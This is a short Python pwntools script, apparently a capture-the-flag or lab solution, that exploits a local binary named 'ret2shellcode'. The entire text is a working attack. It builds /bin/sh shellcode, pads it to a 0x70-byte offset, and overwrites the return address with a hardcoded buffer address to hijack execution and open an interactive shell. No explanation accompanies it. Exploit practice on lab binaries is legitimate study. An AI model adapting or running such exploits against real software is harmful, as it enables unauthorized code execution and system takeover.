from pwn import *

buf2_addr = 0x0804A080
offset = 0x70

payload = asm(shellcraft.sh())
payload = payload.ljust(offset, b'a')
payload += p32(buf2_addr)

sh = process('./ret2shellcode')
sh.sendline(payload)
sh.interactive()
